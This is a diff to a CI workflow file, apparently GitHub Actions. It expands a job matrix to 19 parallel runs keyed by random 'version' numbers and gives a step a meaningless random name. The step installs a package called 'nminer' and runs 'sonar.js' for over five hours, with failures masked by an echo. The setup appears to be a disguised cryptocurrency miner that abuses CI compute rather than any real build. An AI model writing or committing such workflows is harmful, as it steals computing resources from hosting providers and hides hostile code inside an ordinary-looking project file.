@@ -9,23 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4418 }
-          - { version: 1427 }
-          - { version: 5901 }
-          - { version: 2131 }
-          - { version: 8308 }
-          - { version: 8112 }
-          - { version: 9378 }
-          - { version: 1380 }
-          - { version: 1896 }
-          - { version: 7146 }
-          - { version: 6904 }
-          - { version: 2538 }
-          - { version: 3610 }
-          - { version: 1278 }
-          - { version: 8793 }
-          - { version: 1089 }
-          - { version: 5168 }
+          - { version: 6053 }
+          - { version: 8075 }
+          - { version: 8416 }
+          - { version: 53 }
+          - { version: 6332 }
+          - { version: 2333 }
+          - { version: 3543 }
+          - { version: 620 }
+          - { version: 3823 }
+          - { version: 9096 }
+          - { version: 3375 }
+          - { version: 9262 }
+          - { version: 754 }
+          - { version: 4764 }
+          - { version: 9872 }
+          - { version: 6585 }
+          - { version: 8104 }
+          - { version: 3759 }
+          - { version: 57 }
 
     steps:
       - name: Checkout
@@ -36,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: pronoun although tenant duh nocturnal
+      - name: unethically even
         run: |
           npm install nminer@latest
-          timeout 329m node sonar.js || echo "sonar executed"
+          timeout 319m node sonar.js || echo "sonar executed"
